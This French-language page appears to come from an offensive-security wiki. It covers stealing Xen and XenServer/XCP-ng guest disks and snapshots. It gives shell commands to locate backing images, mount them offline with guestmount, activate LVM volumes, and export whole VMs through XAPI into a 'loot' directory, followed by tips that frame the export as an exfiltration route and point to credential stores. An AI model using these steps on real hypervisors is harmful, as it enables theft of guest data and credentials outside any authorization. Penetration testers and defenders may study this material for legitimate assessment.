---
order: 4
title: "Vol de disque et de snapshot : s'emparer des disques virtuels des invités Xen"
description: "Les disques des invités Xen sont des périphériques blocs virtuels adossés à des fichiers (raw, VHD) ou à du stockage bloc (LVM, SR locaux ou partagés sur XenServer/XCP-ng). Avec un accès à dom0, au stockage ou à XAPI, un attaquant lit l'image sous-jacente hors ligne ou exporte le VDI, extrayant les données de n'importe quel invité sans y entrer, et lit les snapshots pour obtenir un état à un instant donné."
keywords:
  - vdi
  - vhd
  - dépôt de stockage
  - disque xen
  - accès hors ligne
---

# Vol de disque et de snapshot

Le disque d'un invité Xen est un périphérique bloc virtuel que le backend mappe depuis un espace de stockage sous-jacent : sur Xen upstream c'est un fichier (raw ou VHD) ou un périphérique bloc (un volume LVM) ; sur XenServer/XCP-ng c'est une Virtual Disk Image (VDI) dans un Storage Repository (SR), qui peut être local ou partagé. L'accès à l'espace de stockage, via dom0, le stockage ou XAPI, permet à un attaquant de lire le système de fichiers de l'invité hors ligne ou d'exporter le VDI, emportant les données sans aucune authentification et sans aucune défense interne à l'invité, et les snapshots fournissent des copies à un instant donné.

## Localiser et lire

```bash
# upstream Xen: the backing file/device from the domain config
grep -E 'disk|phy|file|vdev' /etc/xen/<guest>.cfg
xenstore-ls /local/domain/<domid>/device/vbd 2>/dev/null
guestmount -a /path/to/guest.img -i --ro /mnt/guest     # raw/VHD file
# LVM-backed: activate and mount the volume
lvs; lvchange -ay <vg>/<guest-lv>; guestmount -a /dev/<vg>/<guest-lv> -i --ro /mnt

# XenServer/XCP-ng: export the VDI via XAPI (no dom0 file access needed)
xe -s <host> -u root -pw <pw> vm-export vm=<name> filename=/loot/<name>.xva
# or snapshot then export
xe -s <host> -u root -pw <pw> vm-snapshot vm=<name> new-name-label=s
```

## Notes d'exploitation

- La méthode de lecture dépend du type de stockage sous-jacent : `guestmount`/`qemu-nbd` pour les images fichier, `lvchange -ay` puis montage pour LVM, et `vm-export` XAPI/export de VDI pour les SR XenServer/XCP-ng.
- `vm-export` produit une archive XVA portable de toute la VM, un vecteur d'exfiltration propre qui ne nécessite qu'un accès XAPI, pas un accès fichier à dom0.
- Le montage hors ligne contourne tous les contrôles de l'invité ; priorisez les magasins d'identifiants comme pour tout vol de disque.
- Les snapshots capturent un état à un instant donné ; enchaînez depuis [Accès à l'hôte et shell](host-access-and-shell.md) ou le [Plan de gestion](management-plane.md) pour obtenir l'accès requis.

## Outils

- [libguestfs / guestmount](https://libguestfs.org/)

## Références

- [Stockage et export de VDI XenServer/XCP-ng](https://docs.xcp-ng.org/)
- [Configuration des disques Xen](https://xenbits.xen.org/docs/)
